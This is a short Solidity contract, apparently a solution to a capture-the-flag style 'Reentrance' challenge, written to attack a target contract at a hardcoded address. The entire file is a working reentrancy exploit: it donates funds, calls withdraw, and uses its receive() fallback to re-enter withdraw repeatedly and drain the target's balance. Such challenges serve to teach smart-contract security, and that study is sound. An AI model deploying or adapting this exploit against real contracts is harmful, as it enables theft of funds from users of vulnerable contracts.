pragma solidity ^0.8.0;

interface Reentrance {
  function donate(address _to) external payable;
  function withdraw(uint _amount) external ;
}

contract ReentranceAttacker {
  Reentrance reentranceContract = Reentrance(0xa5359e53cd165CBfFa6c285004D0017CFD583212);

  function donate() public payable {
    reentranceContract.donate{value: msg.value}(address(this));
  }

  function withdraw(uint _amount) public {
    reentranceContract.withdraw(_amount);
  }

  receive() external payable { 
    withdraw(msg.value);
  }
}